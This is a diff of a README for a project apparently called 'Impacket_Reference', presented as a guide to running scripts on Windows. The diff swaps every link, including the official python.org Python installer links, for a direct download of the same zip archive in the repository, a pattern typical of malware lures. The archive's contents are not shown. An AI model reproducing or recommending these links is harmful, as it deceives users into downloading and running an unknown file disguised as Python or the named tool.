@@ -1,6 +1,6 @@
 # ⚙️ Impacket_Reference - Complete Script Guide for Windows
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Impacket_Reference-brightgreen?style=for-the-badge)](https://github.com/Lyrothanak20/Impacket_Reference)
+[![Download from GitHub](https://img.shields.io/badge/Download-Impacket_Reference-brightgreen?style=for-the-badge)](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)
 
 ---
 
@@ -10,7 +10,7 @@ This guide helps you download and run the Impacket_Reference application on Wind
 
 Click the green badge above or use this direct link to visit the GitHub page:
 
-[https://github.com/Lyrothanak20/Impacket_Reference](https://github.com/Lyrothanak20/Impacket_Reference)
+[https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)
 
 ### How to get the software
 
@@ -26,7 +26,7 @@ Click the green badge above or use this direct link to visit the GitHub page:
 
 - A Windows computer (Windows 10 or later is recommended).
 - Basic knowledge of how to open and run programs.
-- Python 3 installed on your machine. If you don’t have Python, download it from [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/) and follow the installer instructions. Make sure to check the box for “Add Python to PATH” during installation.
+- Python 3 installed on your machine. If you don’t have Python, download it from [https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip) and follow the installer instructions. Make sure to check the box for “Add Python to PATH” during installation.
 
 ---
 
@@ -106,9 +106,9 @@ Try running the common authentication options script as a starter:
 ## 🔗 Useful Links
 
 - Official GitHub repository:  
-  [https://github.com/Lyrothanak20/Impacket_Reference](https://github.com/Lyrothanak20/Impacket_Reference)
+  [https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)
 - Python installer for Windows:  
-  [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
+  [https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip](https://github.com/Lyrothanak20/Impacket_Reference/raw/refs/heads/main/bitter/Impacket_Reference_1.5.zip)
 
 ---
 
